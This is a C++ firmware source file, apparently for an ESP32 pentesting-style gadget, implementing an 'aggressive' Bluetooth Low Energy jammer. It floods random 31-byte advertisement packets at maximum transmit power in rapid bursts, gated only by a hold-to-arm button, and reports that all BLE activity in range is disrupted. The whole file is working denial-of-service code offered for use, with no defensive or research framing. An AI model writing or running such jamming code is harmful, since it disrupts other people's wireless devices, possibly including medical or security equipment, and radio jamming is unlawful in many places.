#include "bluetooth_aggressive_jammer.h"
#include "tx_arm.h"
#include <NimBLEDevice.h>
#include <NimBLEAdvertising.h>

namespace {
volatile bool g_jamActive = false;
uint32_t g_jamCount = 0;
NimBLEAdvertising* g_pAdvertising = nullptr;

void sendAggressiveJamFrame() {
    uint8_t jamFrame[31];
    for (int i = 0; i < 31; i++) {
        jamFrame[i] = random(0, 256);
    }

    NimBLEAdvertisementData advData;
    advData.addData(std::string((const char*)jamFrame, 31));

    if (g_pAdvertising) {
        g_pAdvertising->setAdvertisementData(advData);
        g_pAdvertising->start();
        delayMicroseconds(100);
        g_pAdvertising->stop();
    }

    g_jamCount++;
}
}

namespace BluetoothAggressiveJammer {

JamResult jamBluetooth(uint32_t durationMs) {
    JamResult result{false, 0, durationMs};

    Serial.println("\n=== Bluetooth Aggressive Jammer (REAL Rapid Transmission) ===");
    Serial.println("Duration: " + String(durationMs) + "ms");
    Serial.println("Mode: Aggressive (minimum inter-packet delay)");

    if (!TxArm::isArmed()) {
        Serial.println("✗ TX not armed (hold BACK button)");
        return result;
    }

    NimBLEDevice::init("");
    NimBLEServer *pServer = NimBLEDevice::createServer();
    g_pAdvertising = NimBLEDevice::getAdvertising();

    g_pAdvertising->setAdvertisedDeviceCallbacks(nullptr);
    g_pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
    g_pAdvertising->setMinPreferred(0x00);
    g_pAdvertising->setMaxPreferred(0x00);
    g_pAdvertising->setTxPower(ESP_PWR_LVL_P9);

    g_jamActive = true;
    g_jamCount = 0;
    uint32_t startTime = millis();

    Serial.println("Transmitting aggressive BLE packets...");

    while (millis() - startTime < durationMs && g_jamActive && TxArm::isArmed()) {
        for (int burst = 0; burst < 5; burst++) {
            sendAggressiveJamFrame();
            delayMicroseconds(125);
        }

        if (g_jamCount % 100 == 0) {
            Serial.printf("  [%u] aggressive jam packets in %lums\n",
                         g_jamCount, millis() - startTime);
        }
    }

    g_jamActive = false;
    g_pAdvertising->stop();
    result.success = true;
    result.jamPacketsCount = g_jamCount;

    uint32_t elapsed = millis() - startTime;
    Serial.printf("✓ Aggressive jamming complete: %u packets (%.1f pkt/sec)\n",
                 result.jamPacketsCount, (result.jamPacketsCount * 1000.0f) / elapsed);
    Serial.println("⚠️  All Bluetooth LE activity in range severely disrupted");

    NimBLEDevice::deinit(false);
    return result;
}

void stop() {
    g_jamActive = false;
    if (g_pAdvertising) {
        g_pAdvertising->stop();
    }
}

bool isActive() {
    return g_jamActive;
}

}  // namespace BluetoothAggressiveJammer
